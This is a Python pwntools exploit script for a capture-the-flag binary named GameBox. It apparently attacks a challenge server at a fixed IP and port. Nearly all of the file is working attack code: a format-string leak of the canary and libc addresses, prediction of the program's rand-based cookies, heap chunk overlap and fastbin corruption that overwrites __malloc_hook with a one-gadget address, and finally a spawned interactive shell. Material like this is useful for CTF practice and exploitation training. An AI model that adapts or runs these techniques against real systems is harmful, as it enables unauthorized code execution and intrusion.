## file: exp for gamebox ## date: 2018-04-26## author: raycp

from pwn import *from ctypes import *DEBUG = 1if DEBUG:     p = process('./GameBox')     #scontext.log_level = 'debug'     #libc = ELF('/lib32/libc-2.24.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     else:     p = remote('39.107.33.43', 13570)     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #libc = ELF('libc_64.so.6')#context.log_level = 'debug'wordSz = 4hwordSz = 2bits = 32PIE = 0mypid=0def leak(address, size):   with open('/proc/%s/mem' % mypid) as mem:      mem.seek(address)      return mem.read(size)def findModuleBase(pid, mem):   name = os.readlink('/proc/%s/exe' % pid)   with open('/proc/%s/maps' % pid) as maps:      for line in maps:         if name in line:            addr = int(line.split('-')[0], 16)            mem.seek(addr)            if mem.read(4) == "\x7fELF":               bitFormat = u8(leak(addr + 4, 1))               if bitFormat == 2:                  global wordSz                  global hwordSz                  global bits                  wordSz = 8                  hwordSz = 4                  bits = 64               return addr   log.failure("Module's base address not found.")   sys.exit(1)def debug(addr):    global mypid    mypid = proc.pidof(p)[0]    #raw_input('debug:')    with open('/proc/%s/mem' % mypid) as mem:        moduleBase = findModuleBase(mypid, mem)        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))libc = CDLL("/lib/x86_64-linux-gnu/libc-2.23.so")cookie={}def get_cookie():    stri=""    for i in range(0,24):        stri+=chr(libc.rand()%26+0x41)    return stridef play(idx,length,name):    global cookie    p.recvuntil("(E)xit\n")    p.sendline("P")    p.recvuntil("write:\n")    data=get_cookie()    #print data    cookie[str(idx)]=data    p.sendline(data)    #print p.recv()    p.recvuntil('You great prophet!')    p.recvuntil("length:")    p.sendline(str(length))    p.recvuntil('name:')    p.send(name)def show():    p.recvuntil("(E)xit\n")    p.sendline("S")    p.recvuntil('=======RANK LIST=======')    def delete(idx):    global cookie    p.recvuntil("(E)xit\n")    sleep(1)    p.sendline("D")    p.recvuntil('dex:')    p.sendline(str(idx))    p.recvuntil('Cookie:')    p.sendline(cookie[str(idx)])    #cookie.remove(cookie[idx])def delete1(idx):           p.recvuntil("(E)xit\n")    p.sendline("D")    p.recvuntil('dex:')    p.send(str(idx))    #p.recvuntil('Cookie:')    #p.sendline(cookie[idx])   printf_got=0x203050free_got=0x203018def pwn():    ## use format vuln to leak address    play(0,100,"%7$p%8$p%9$p%13$p%15$p")    show()    p.recvuntil('0x')    canary=p.recvuntil('0x')[:-2]    data=p.recvuntil('0x')[:-2].ljust(8,'\x00')    print data,canary    stack_addr=int(data,16)    base=int(p.recvuntil('0x')[:-2],16)-0x18d5    libc_start_main=int(p.recvuntil('0x')[:-2],16)    libc_base=libc_start_main-0x20830        print "canary",canary    print "stack_addr",hex(stack_addr)    print "program base",hex(base)    print "libc_base",hex(libc_base)        system_addr=libc_base+0x45390    malloc_hook_addr=libc_base+lib.symbols['__malloc_hook']    rce=libc_base+0xf1147    print "system_addr",hex(system_addr)        play(1,0x28,'a'*0x28)              #1    #debug(0x15c9)    play(2,0x200,'2'*0x1f0+p64(0x200)) #2    play(3,0x100,'3'*0x100)            #3    #play()    #debug(0x11a8)    delete(2)    delete(1)    #debug(0x15c9)    play(1,0x28,'1'*0x28) #1    play(2,0x100,'2')     #2    play(4,0x60,'4')      #4    #debug(0x11a8)    delete(2)    delete(3)    delete(4)    #raw_input()    #    play(1,0x200,'\x00'*0x100+p64(0)+p64(0x71)+p64(malloc_hook_addr-0x1b - 8))    play(2,0x60,'1')    play(3,0x60,'\x00'*(0xb+8)+p64(rce))    #print hex(rce)    #debug(0x15c9)    #play(4,0x40,'5')        # get shell    p.recvuntil("(E)xit\n")    p.sendline("P")    p.recvuntil("write:\n")    data=get_cookie()    p.sendline(data)    p.recvuntil('You great prophet!')    p.recvuntil("length:")    p.sendline(str(0x60))    p.interactive()if __name__ == '__main__':   pwn()     